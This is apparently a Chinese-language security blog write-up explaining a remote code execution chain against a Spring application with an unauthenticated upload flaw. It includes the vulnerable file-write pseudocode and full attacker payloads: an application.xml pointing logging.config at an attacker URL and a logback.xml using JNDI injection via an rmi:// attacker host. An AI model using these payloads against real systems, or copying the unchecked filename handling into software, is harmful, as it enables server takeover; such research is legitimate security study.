### 利用 Spring 属性实现远程代码执行

2024年11月25日

最近，一名曾经的学生向我展示了一个在Spring应用中存在的未经身份验证的漏洞，他们在利用时遇到了困难。上周末，我花时间研究了这个问题，最终找到了一种相对干净的解决方案。尽管我更希望能找到一种更通用的方法来利用Spring应用中的这个漏洞，但我们还是可以深入探讨一下这个问题。

#### 漏洞描述
由于这不是我发现的漏洞且尚未修复，我只能分享一下伪代码。漏洞的代码大致如下：

```java
/*  152 */ MultipartHttpServletRequest multipartRequest = (MultipartHttpServletRequest)request;
/*  153 */ MultipartFile multipart = multipartRequest.getFile("file");
/*  154 */ String fileName = multipart.getOriginalFilename(); // 1
/*  155 */ String fileExtension = FilenameUtils.getExtension(fileName); // 2
/*  156 */ if (!supportContentType(fileExtension)) { // 3
/*  157 */   throw new Exception("不支持的文件类型");
/*  159 */ }
/*  160 */ File file = new File(fileName);
/*  161 */ multipart.transferTo(file); // 4
```

`supportContentType`函数用于检查文件扩展名是否在允许的列表中。如果文件扩展名不在允许列表中，代码会抛出异常。然而，如果扩展名在允许列表中，文件会被写入服务器的默认目录（Tomcat的`bin`目录）。此时，我们并不能控制文件的写入位置。

#### 漏洞利用思路
虽然文件写入被限制，但可以利用`.zip`和`.xml`扩展名进行攻击。Tomcat对`.xml`文件有特殊处理，我决定先尝试这种方式。在观察Tomcat进程时，我注意到它尝试加载一个不存在的文件：`application.xml`。

将一个无效的XML文件放入该目录后，我看到了一个栈追踪，表明Tomcat正在尝试加载该文件。经过进一步分析，我发现Spring框架的配置文件会按照以下顺序被加载：

- properties
- xml
- yml
- yaml

在对Spring日志配置进行深入研究时，我发现`logging.config`属性是一个潜在的攻击点。这个属性会被`LoggingApplicationListener`类读取，并且如果能够通过漏洞修改这个属性的值，可能会远程加载恶意配置。

#### 最终利用
通过设置`logging.config`为攻击者控制的URL，可以加载恶意的`logback.xml`文件。这个文件可以利用JNDI注入技术，远程执行代码。最终的攻击链如下：

1. 使用XML文件修改Spring日志配置。
2. 加载恶意的`logback.xml`文件，配置日志框架。
3. 使用JNDI注入执行远程代码。

#### 漏洞示例
以下是一个攻击者控制的`application.xml`和`logback.xml`文件的示例：

`application.xml`:
```xml
<!DOCTYPE properties SYSTEM "http://java.sun.com/dtd/properties.dtd">
<properties>
    <entry key="logging.config">http://[攻击者]:[端口]/logback.xml</entry>
</properties>
```

`logback.xml`:
```xml
<configuration>
  <insertFromJNDI env-entry-name="rmi://[攻击者]:1099/Object" as="appName" />
</configuration>
```

这样就成功地在不认证的情况下利用了Spring应用中的漏洞，最终实现了远程代码执行。